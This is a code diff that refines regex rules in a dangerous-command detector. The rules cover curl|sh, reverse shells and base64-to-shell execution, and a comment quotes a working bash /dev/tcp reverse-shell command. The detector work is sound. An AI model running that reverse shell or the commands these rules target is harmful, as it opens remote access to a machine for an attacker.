@@ -166,15 +166,18 @@ _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
     #   加负向后顾：前面紧邻 `.` 的一律视为方法调用（re.exec / model.eval）。
     (r"(?<!\.)\beval\s*\(", "动态代码执行 eval"),
     (r"(?<!\.)\bexec\s*\(", "动态代码执行 exec"),
-    (r"\b(?:curl|wget)\b[^\n|;]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
-    (r"\b(?:curl|wget)\b[^\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
+    # ★★ 2026-11-03（同类加固）：以下四条原本用 `[^\n]*`，会跨过 `&`
+    #   把后续命令里的片段算到前一条命令头上（与 del 通配符同一类误报）。
+    #   统一改为「遇到 & | ; 换行即止」，只在本命令段内匹配。
+    (r"\b(?:curl|wget)\b[^&|;\n]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
+    (r"\b(?:curl|wget)\b[^&|;\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
     (r"\bnc\b\s+-[a-z]*e\b|\bnetcat\b\s+-[a-z]*e\b", "反弹 shell（nc -e）"),
     # ★ 无 nc 的反弹 shell：bash/zsh/sh 内建 /dev/tcp 重定向。
     #   这是现代脚本里最常见的写法之一（不依赖任何外部二进制），
     #   原规则表只覆盖 nc -e，实测漏放：
     #     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
     (r"/dev/(?:tcp|udp)/[\w.:-]+", "反弹 shell（内建 /dev/tcp 重定向）"),
-    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^\n]*&", "反弹 shell（交互式 shell 重定向）"),
+    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^&|;\n]*&", "反弹 shell（交互式 shell 重定向）"),
     # ★★ 2026-10-28（误报修复，日志 #7496 / #7515）：
     #   旧判据是「python -c + (socket|subprocess|os.system)」即 high。
     #   但 `python -c "import subprocess; subprocess.run(['git', ...])"`
@@ -182,11 +185,14 @@ _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
     #   真正危险的不是「用了 subprocess」，而是内联代码里出现
     #   **网络原语或动态求值**：那才是把回答变成投递通道的形态。
     #   破坏性命令（rm -rf / dd / mkfs）仍由上面的独立规则命中。
-    (r"\bpython[23]?\s+-c\b[^\n]*(?:socket\.|urlopen|urllib|"
+    #   ★ 这里只排除 `&`（shell 后台分隔符），保留 `;` 与 `|` ——
+    #     它们常出现在内联 Python 代码里（`import socket; socket.socket()`），
+    #     一并排除会把真实攻击放过。
+    (r"\bpython[23]?\s+-c\b[^&\n]*(?:socket\.|urlopen|urllib|"
      r"http\.client|requests\.(?:get|post|put|patch)|httpx\.|"
      r"exec\s*\(|eval\s*\()",
      "Python 内联执行网络/动态代码"),
-    (r"\bbase64\s+-d\b[^\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
+    (r"\bbase64\s+-d\b[^&|;\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
 ]
 
 # 敏感文件路径模式
